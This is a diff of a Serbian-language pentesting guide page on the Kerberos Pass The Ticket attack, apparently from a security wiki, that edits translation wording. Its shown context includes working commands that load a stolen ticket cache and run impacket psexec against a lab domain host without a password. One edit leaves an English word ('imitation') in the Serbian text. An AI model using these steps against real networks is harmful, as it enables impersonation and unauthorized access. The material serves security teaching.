@@ -4,14 +4,14 @@
 
 ## Pass The Ticket (PTT)
 
-U metodi napada **Pass The Ticket (PTT)**, napadači **kradu korisnički autentifikacioni tiket** umesto njihove lozinke ili heš vrednosti. Ovaj ukradeni tiket se zatim koristi za **impostaciju korisnika**, stičući neovlašćen pristup resursima i uslugama unutar mreže.
+U metodi napada **Pass The Ticket (PTT)**, napadači **kradu korisnički autentifikacioni tiket** umesto njihove lozinke ili heš vrednosti. Ovaj ukradeni tiket se zatim koristi za **imitation korisnika**, stičući neovlašćen pristup resursima i uslugama unutar mreže.
 
 **Pročitajte**:
 
 - [Berba tiketa sa Windows-a](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
 - [Berba tiketa sa Linux-a](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
 
-### **Razmena Linux i Windows tiketa između platformi**
+### **Zamena Linux i Windows tiketa između platformi**
 
 Alat [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) konvertuje formate tiketa koristeći samo tiket i izlaznu datoteku.
 ```bash
@@ -23,7 +23,7 @@ Converting kirbi => ccache
 ```
 U Windows-u [Kekeo](https://github.com/gentilkiwi/kekeo) može se koristiti.
 
-### Pass The Ticket Attack
+### Napad Pass The Ticket
 ```bash:Linux
 export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
